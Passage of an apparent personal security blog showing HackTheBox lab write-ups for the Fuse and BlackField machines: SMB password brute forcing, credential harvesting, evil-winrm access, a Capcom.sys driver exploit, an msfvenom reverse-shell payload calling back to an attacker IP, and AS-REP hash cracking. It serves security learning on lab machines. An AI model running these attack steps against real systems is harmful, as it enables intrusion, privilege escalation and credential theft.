<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          


<div class="index slideDownMin">
	

	<div class="profile">

		<img class="avatar" src="/images/avatar.jpg">

		<p class="author">Ikonw</p>

<div class="social">

<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
</a>

<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
</a>

</div>
	</div>


	

	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/06/15/HTB-Fuse/">HTB Fuse Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jun 15, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p><img src="/images/HTB-Fuse-Medium/image-20200907105043113.png" alt="image-20200907105043113"></p>
<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed Sep  2 03:57:19 2020 as: nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698 -oN nmap/Full_10.10.10.193.nmap 10.10.10.193</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.193</span><br><span class="line">Host is up (0.0079s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-02 08:10:26Z)</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)</span></span><br><span class="line"><span class="string">464/tcp   open  kpasswd5?</span></span><br><span class="line"><span class="string">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open  tcpwrapped</span></span><br><span class="line"><span class="string">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="string">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">9389/tcp  open  mc-nmf       .NET Message Framing</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">49676/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49680/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49698/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port53-TCP:V=7.80%I=7%D=9/2%Time=5F4F506B%P=x86_64-pc-linux-gnu%r(DNSVe</span></span><br><span class="line"><span class="string">SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span></span><br><span class="line"><span class="string">SF:04bind\0\0\x10\0\x03");</span></span><br><span class="line"><span class="string">Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span></span><br><span class="line"><span class="string">|   Computer name: Fuse</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: FUSE\x00</span></span><br><span class="line"><span class="string">|   Domain name: fabricorp.local</span></span><br><span class="line"><span class="string">|   Forest name: fabricorp.local</span></span><br><span class="line"><span class="string">|   FQDN: Fuse.fabricorp.local</span></span><br><span class="line"><span class="string">|_  System time: 2020-09-02T01:12:45-07:00</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: required</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   2.02: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2020-09-02T08:12:42</span></span><br><span class="line"><span class="string">|_  start_date: 2020-09-02T08:04:25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Wed Sep  2 04:01:52 2020 -- 1 IP address (1 host up) scanned in 273.40 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure>

<p>We get the FQDN from the smb-os-discovery script</p>
<p>add it to the <strong>/etc/hosts</strong></p>
<p>I like to enumerate smb ports first</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment"># enum4linux Fuse.fabricorp.local</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep  7 11:02:19 2020</span><br></pre></td></tr></tbody></table></figure>

<p>However it didnt give me any critical information, anonymous login didnt get me anything too</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbclient -L 10.10.10.193                                                       </span></span><br><span class="line">Enter WORKGROUP\root<span class="string">'s password: </span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure>

<p>Start investigate the web, it‚Äôs a papercut CMS if im not wrong. </p>
<p>Found some user in each print logs</p>
<p><img src="/images/HTB-Fuse-Medium/image-20200907111546993.png" alt="image-20200907111546993"></p>
<p>We collect all the user</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pmerton</span><br><span class="line">tlavel</span><br><span class="line">sthompson</span><br><span class="line">bhult</span><br><span class="line">administrator</span><br></pre></td></tr></tbody></table></figure>

<p>According to previous box such as <strong>sauna</strong>.</p>
<p>The entry point most likely is to collect user and password from the web server and brute force on smb ports.</p>
<p>Therefore we use <strong>cewl</strong> to make a collection of password dictionary.</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">cewl -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm -m3 --with-numbers</span><br></pre></td></tr></tbody></table></figure>

<p>Launch msfconsole use the <strong>smb_login</strong> module to bruteforce </p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> USER_FILE user</span><br><span class="line">USER_FILE =&gt; user</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> PASS_FILE wordlist</span><br><span class="line">PASS_FILE =&gt; wordlist</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> rhosts 10.10.10.193</span><br><span class="line">rhosts =&gt; 10.10.10.193</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> smbdomain fabricorp.local</span><br><span class="line">smbdomain =&gt; fabricorp.local</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; run</span><br></pre></td></tr></tbody></table></figure>

<p>successfully got 2 creds</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">'fabricorp.local\tlavel:Fabricorp01'</span></span><br><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">'fabricorp.local\bhult:Fabricorp01'</span></span><br></pre></td></tr></tbody></table></figure>

<p>Trying login to smb server, but was prompt with error which I never meet. Both account have the same problem</p>
<figure class="highlight arduino"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">‚îî‚îÄ<span class="meta"># smbclient -L 10.10.10.193 -U tlavel           </span></span><br><span class="line">Enter WORKGROUP\tlavel<span class="number">'</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br><span class="line">                                                                                                                   </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">‚îî‚îÄ<span class="meta"># smbclient -L 10.10.10.193 -U bhult                                                                         </span></span><br><span class="line">Enter WORKGROUP\bhult<span class="number">'</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></tbody></table></figure>

<p>After some google,find out I can use smbpasswd to change the password</p>
<p><img src="/images/HTB-Fuse-Medium/image-20200907113508780.png" alt="image-20200907113508780"></p>
<p>There seems some password policy, so I change the password to <strong>Fabricop011</strong> for both accout</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbpasswd -r 10.10.10.193 -U tlavel                                                                        </span></span><br><span class="line">Old SMB password:</span><br><span class="line">New SMB password:</span><br><span class="line">Retype new SMB password:</span><br><span class="line">Password changed <span class="keyword">for</span> user tlavel on 10.10.10.193.</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>After some enumeration on <strong>rpcclient</strong> and password <strong>$fab@s3Rv1ce$1</strong></p>
<p>found some username </p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br></pre></td></tr></tbody></table></figure>

<p>and one password</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">        flags:[0x800000]</span><br><span class="line">        name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: <span class="variable">$fab</span>@s3Rv1ce<span class="variable">$1</span>)]</span><br><span class="line">        comment:[]</span><br></pre></td></tr></tbody></table></figure>

<p>and we try to login to windows using this credentials.</p>
<p>Went back to to msfconsole, we lanuch <strong>win_rm</strong> module to brute force the username against the password</p>
<p>and we got the creds <strong>svc-print:$fab@s3Rv1ce$1</strong></p>
<p>use <strong>evil-winrm</strong> to login</p>
<figure class="highlight moonscript"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/evil-winrm]</span><br><span class="line">‚îî‚îÄ# ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.193</span> -u svc-<span class="built_in">print</span> -p \$fab@s3Rv1ce\$<span class="number">1</span>                                           <span class="number">1</span> ‚®Ø</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="name">Info</span>: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">d-r<span class="comment">---         6/1/2020   1:45 AM                Desktop</span></span><br><span class="line">d-r<span class="comment">---        5/31/2020   5:20 PM                Documents</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Downloads</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Favorites</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Links</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Music</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Pictures</span></span><br><span class="line">d<span class="comment">-----        7/16/2016   6:18 AM                Saved Games</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Videos</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-print\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">-ar<span class="comment">---         9/7/2020  12:35 AM             34 user.txt</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After getting root, check user‚Äôs privilege </p>
<figure class="highlight abnf"><table><tbody><tr><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeLoadDriverPrivilege         Load and unload device drivers Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></tbody></table></figure>

<p><strong>seLoadDrivePrivilege</strong> is enabled</p>
<p><a target="_blank" rel="noopener" href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">Abusing SeLoadDriverPrivilege for privilege escalation</a></p>
<p>This site is a good reference for SeLoadDriverPrivilege escalation</p>
<p><a target="_blank" rel="noopener" href="https://github.com/umiterkol/EoPLoadDriver_Release/releases">EopLoaddriver</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys">Capcom.sys</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a></p>
<p>open up the ExploitCapcom.cpp file, modify the Launch shell function. Change the commandLine[] targeted to a meterpreter.exe and compile it.</p>
<p><img src="/images/placeholder.png" alt="image-20200907191952261" data-src="/images/HTB-Fuse-Medium/image-20200907191952261.png" class="lazyload"></p>
<p>Next we have to generate a meterpreter.exe</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1234 -f exe &gt; meterpreter.exe</span><br></pre></td></tr></tbody></table></figure>

<p>Create a folder called <strong>temp</strong> in C:\</p>
<p>and upload all the 4 files to the target server.</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</span><br><span class="line">[+] Enabling SeLoadDriverPrivilege</span><br><span class="line">[+] SeLoadDriverPrivilege Enabled</span><br><span class="line">[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService</span><br><span class="line">NTSTATUS: c000010e, WinError: 0</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe</span><br><span class="line">[*] Capcom.sys exploit</span><br><span class="line">[*] Capcom.sys handle was obtained as 0000000000000080</span><br><span class="line">[*] Shellcode was placed at 000002841CC20008</span><br><span class="line">[+] Shellcode was executed</span><br><span class="line">[+] Token stealing was successful</span><br><span class="line">[+] The SYSTEM shell was launched</span><br><span class="line">[*] Press any key to <span class="built_in">exit</span> this program</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>And we got the meterpreter session on our multi handler</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/medium/">medium</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/06/15/HTB-Fuse/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/06/10/HTB-BlackField/">HTB BlackField Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jun 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p><img src="/images/placeholder.png" alt="image-20200907210058092" data-src="/images/HTB-Blackfield-Hard/image-20200907210058092.png" class="lazyload"></p>
<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.192</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE       VERSION</span><br><span class="line">88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)</span><br><span class="line">135/tcp  open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open     microsoft-ds?</span><br><span class="line">593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-09-07T19:09:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Launch smbmap login using anonymous account, found 2 files we can read</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/nmapAutomator]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbmap -H 10.10.10.192 -u anonymous                                                                                   2 ‚®Ø</span></span><br><span class="line">[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<p>Access to <strong>profiles$</strong></p>
<p>We found tons of user name, use along with awk command we collect the usernames</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.192\\profiles$ -c <span class="built_in">ls</span> | awk <span class="string">'{print $1}'</span> &gt; user.lst</span><br></pre></td></tr></tbody></table></figure>

<p>Launch the impacket tool <strong>GetNPUsers.py</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">‚îî‚îÄ<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v "not found"</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User audit2020 doesn<span class="string">'t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12</span></span><br><span class="line"><span class="string">[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] invalid principal syntax</span><br></pre></td></tr></tbody></table></figure>

<p>Save the hash and use john to crack it.</p>
<p>We got the creds <strong>support:#00^BlackKnight</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">‚îî‚îÄ<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt user_hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line"><span class="comment">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span></span><br><span class="line">1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s <span class="comment">#1ByNature..#*burberry#*1990</span></span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Try login using winrm port, but it failed.</p>
<p>Let‚Äôs go back to use new credentials to smb server</p>
